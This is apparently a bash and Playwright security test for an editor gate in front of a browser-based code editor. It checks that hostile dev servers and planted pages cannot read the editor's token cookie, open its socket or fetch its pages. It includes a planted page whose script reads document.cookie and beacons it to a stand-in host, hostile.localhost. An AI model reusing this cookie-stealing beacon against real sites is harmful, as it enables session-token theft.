#!/usr/bin/env bash
# The outer editor behind editor-gate.ts, in a real browser: it works, and a
# page another site serves cannot read its token or act as it.
#
#   ./tests/environments/editor-gate/run.sh <editor-image>
#
# One container holds the editor (server on its loopback, the gate on :3000)
# and a stand-in for a hostile project's dev server on :8081, which serves one
# page whatever host it is asked for. Headless Chromium (Playwright) runs in
# that container's network namespace, so `*.localhost` -- which Chromium
# resolves to loopback itself -- reaches both, as it reaches the Mac's
# forwards. Each attack has its control: the same step, done the way the user
# does it, succeeding.
#
#   hostile.localhost:8081   the dev server, under its own name (hosts.ts)
#   desolate.localhost:8081  the dev server under the EDITOR's name -- what the
#                            ingress refuses (ingress.py WHOSE NAME); here
#                            nothing refuses it, which is the control showing
#                            the cookie is there to be read from that host
#
# Needs a docker daemon that can pull mcr.microsoft.com/playwright and npm's
# `playwright` -- through the proxy, with its CA, when run inside desolate.
set -uo pipefail
ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)
# shellcheck source=../../lib/harness.sh
. "$ROOT/tests/lib/harness.sh"
IMAGE=${1:?usage: run.sh <editor-image>}
EDITOR=desolate-gate-editor BROWSER=desolate-gate-browser
TOKEN=gate-test-token-$$
PLAYWRIGHT=mcr.microsoft.com/playwright:v1.49.1-noble
CA=${DESOLATE_TEST_CA:-/desolate/ca/ca.pem}
LIB=/usr/local/lib/desolate

cleanup() { docker rm -f "$EDITOR" "$BROWSER" >/dev/null 2>&1; }
trap '[ -n "${DESOLATE_TEST_KEEP:-}" ] || cleanup' EXIT
cleanup

# The editor as compose runs it (docker-compose.yml): the gate on 3000, the
# server on loopback behind it. This branch's gate and hosts.ts, over the image's.
docker create --name "$EDITOR" --entrypoint sh "$IMAGE" -c "
  node $LIB/editor-gate.ts 3000 3001 &
  node $LIB/hostile.js &
  exec /home/.desolate-shell/bin/codium-server --host=127.0.0.1 --port=3001 --connection-token=$TOKEN" >/dev/null \
  || { fail "create the editor from $IMAGE"; summary; exit 1; }
for f in hosts.ts editor-gate.ts utils.ts; do docker cp "$ROOT/release/vscode-image/$f" "$EDITOR:$LIB/$f" >/dev/null; done
# The dev server: any host, one page that shows its cookie jar; it keeps a log
# of what it was asked, which the browser reads back at /log.
HOSTILE=$(mktemp -d)
cat > "$HOSTILE/hostile.js" <<'EOF'
const seen = [];
require("node:http").createServer((q, r) => {
  if (q.url === "/log") { r.writeHead(200, { "content-type": "text/plain" }); return r.end(seen.join("\n")); }
  seen.push(q.url);
  if (q.url.startsWith("/beacon")) { r.writeHead(204); return r.end(); }
  r.writeHead(200, { "content-type": "text/html" });
  r.end('<!doctype html><title>dev server</title><p id=jar></p><script>document.getElementById("jar").textContent = "JAR[" + document.cookie + "]"</script>');
}).listen(8081, "0.0.0.0");
EOF
docker cp "$HOSTILE/hostile.js" "$EDITOR:$LIB/hostile.js" >/dev/null
rm -rf "$HOSTILE"
docker start "$EDITOR" >/dev/null
# A file a project wrote, which the editor serves from /workspaces. Its script,
# if it runs, says what it could read.
docker exec -i -u 0 "$EDITOR" sh -c 'mkdir -p /workspaces/hostile && cat > /workspaces/hostile/steal.html' <<'EOF'
<!doctype html><title>planted</title>
<script>let jar; try { jar = document.cookie } catch (e) { jar = "blocked-" + e.name }
new Image().src = "http://hostile.localhost:8081/beacon/script?jar=" + encodeURIComponent(jar);</script>
EOF
for _ in $(seq 60); do
  docker exec "$EDITOR" sh -c 'exec 3<>/dev/tcp/127.0.0.1/3000' 2>/dev/null && break
  sleep 1
done

docker create --name "$BROWSER" --network "container:$EDITOR" -e NODE_EXTRA_CA_CERTS=/ca.pem \
  "$PLAYWRIGHT" sh -c 'mkdir -p /run/test && cd /run/test && npm init -y >/dev/null \
    && npm install --silent playwright@1.49.1 >/dev/null && cp /test.js . && node test.js' >/dev/null
[ -f "$CA" ] && docker cp "$CA" "$BROWSER:/ca.pem" >/dev/null
SCRIPT=$(mktemp -d)
trap '[ -n "${DESOLATE_TEST_KEEP:-}" ] || cleanup; rm -rf "$SCRIPT"' EXIT
cat > "$SCRIPT/test.js" <<EOF
const { chromium } = require("playwright");
const EDITOR = "http://desolate.localhost:3000", TOKEN = "$TOKEN";
const RESOURCE = EDITOR + "/vscode-remote-resource?path=/workspaces/hostile/steal.html";
const WS = "ws://desolate.localhost:3000/?reconnectionToken=probe&reconnection=false&skipWebSocketFrames=false";
(async () => {
  const report = {};
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  const text = async (p) => (await p.locator("body").innerText().catch(() => "")).slice(0, 300);
  const opens = (p, url) => p.evaluate((url) => new Promise((done) => {
    const ws = new WebSocket(url);
    ws.onopen = () => { ws.close(); done("open"); };
    ws.onerror = () => done("refused");
    setTimeout(() => done("timeout"), 5000);
  }), url);

  // The user's way in: the URL cli.sh prints, typed.
  await page.goto(EDITOR + "/?tkn=" + TOKEN + "&folder=/workspaces");
  await page.waitForSelector(".monaco-workbench", { timeout: 90000 });
  await page.waitForSelector(".explorer-folders-view .monaco-list-row", { timeout: 60000 }).catch(() => {});
  await page.waitForTimeout(3000);
  report.explorer = await page.locator(".explorer-folders-view").innerText().catch(() => "");
  report.cookies = (await context.cookies()).map((c) => c.domain + ":" + c.name).join(",");
  report.ownSocket = await opens(page, WS);

  // The old address: refused, with the one to use.
  const old = await context.newPage();
  const oldAnswer = await old.goto("http://127.0.0.1:3000/?tkn=" + TOKEN);
  report.oldStatus = oldAnswer.status();
  report.oldText = await text(old);

  // A hostile project's dev server, under its own name.
  const hostile = await context.newPage();
  await hostile.goto("http://hostile.localhost:8081/");
  report.hostileJar = await text(hostile);
  report.hostileSocket = await opens(hostile, WS);
  report.hostileFetch = await hostile.evaluate((url) => fetch(url, { credentials: "include" })
    .then((r) => "read " + r.status).catch((e) => "failed: " + e.name), EDITOR + "/");
  // ... sending the browser to a page the project wrote, at the editor's origin.
  await Promise.all([hostile.waitForLoadState("load"), hostile.evaluate((url) => { location.href = url; }, RESOURCE)]);
  await hostile.waitForTimeout(1500);
  report.navigatedStatus = await hostile.evaluate(() => performance.getEntriesByType("navigation")[0]?.responseStatus ?? 0);
  report.navigatedText = await text(hostile);
  const log = async () => (await (await context.request.get("http://127.0.0.1:8081/log")).text());
  report.logAfterAttack = await log();

  // Control: the dev server under the editor's own name reads the cookie --
  // which is why the ingress holds each port to its own name.
  const sameHost = await context.newPage();
  await sameHost.goto("http://desolate.localhost:8081/");
  report.sameHostJar = await text(sameHost);

  // Control: the planted page, opened the user's way, is served -- in a sandbox.
  const typed = await context.newPage();
  const typedAnswer = await typed.goto(RESOURCE);
  report.typedStatus = typedAnswer.status();
  report.typedCsp = typedAnswer.headers()["content-security-policy"] || "";
  await typed.waitForTimeout(1500);
  report.logAfterTyped = await log();
  // Control for that: the same file from the server itself, past the gate --
  // its script runs, and says what it read.
  const bypass = await context.newPage();
  await bypass.goto("http://127.0.0.1:3001/vscode-remote-resource?path=/workspaces/hostile/steal.html&tkn=" + TOKEN);
  await bypass.waitForTimeout(1500);
  report.logAfterBypass = await log();

  console.log("REPORT " + JSON.stringify(report));
  await browser.close();
})().catch((err) => { console.log("REPORT " + JSON.stringify({ error: String(err) })); process.exit(1); });
EOF
docker cp "$SCRIPT/test.js" "$BROWSER:/test.js" >/dev/null
docker start -a "$BROWSER" >/dev/null 2>&1
OUTPUT=$(docker logs "$BROWSER" 2>&1)
REPORT=$(printf '%s\n' "$OUTPUT" | sed -n 's/^REPORT //p' | tail -1)
field() { node -e 'const r = JSON.parse(process.argv[1] || "{}"); process.stdout.write(String(r[process.argv[2]] ?? "").replace(/ /g, " "))' "$REPORT" "$1"; }

group "the editor works through the gate"
[ -n "$REPORT" ] || { fail "the browser ran" "$(printf '%s' "$OUTPUT" | tail -5)"; summary; exit 1; }
[ -z "$(field error)" ] || { fail "the browser script finished" "$(field error)"; summary; exit 1; }
assert_contains "the explorer lists /workspaces over the editor's connection" "$(field explorer)" "hostile"
assert_contains "the token's cookie is the editor host's" "$(field cookies)" "desolate.localhost:vscode-tkn"
assert_eq "the editor's own page opens its socket" "$(field ownSocket)" "open"
assert_eq "127.0.0.1 is refused" "$(field oldStatus)" "421"
assert_contains "  with the address to use" "$(field oldText)" "desolate.localhost"

group "a page another site serves cannot act as the editor"
assert_contains "the dev server's page reads no editor cookie" "$(field hostileJar)" "JAR[]"
assert_eq "  nor opens the editor's socket" "$(field hostileSocket)" "refused"
assert_contains "  nor reads the editor's pages" "$(field hostileFetch)" "failed"
assert_eq "sending the browser to a page the project planted is refused" "$(field navigatedStatus)" "403"
assert_contains "  by the gate" "$(field navigatedText)" "editor-gate: refused"
assert_not_contains "  and the planted page never rendered" "$(field logAfterAttack)" "/beacon/"
assert_contains "control: under the editor's name, that page WOULD read the token" "$(field sameHostJar)" "vscode-tkn=$TOKEN"
assert_eq "control: opened the user's way, the planted page is served" "$(field typedStatus)" "200"
assert_eq "  sandboxed" "$(field typedCsp)" "sandbox"
assert_not_contains "  where its script does not run, and reads nothing" "$(field logAfterTyped)" "/beacon/script"
assert_contains "control: past the gate, that script runs" "$(field logAfterBypass)" "/beacon/script"
summary
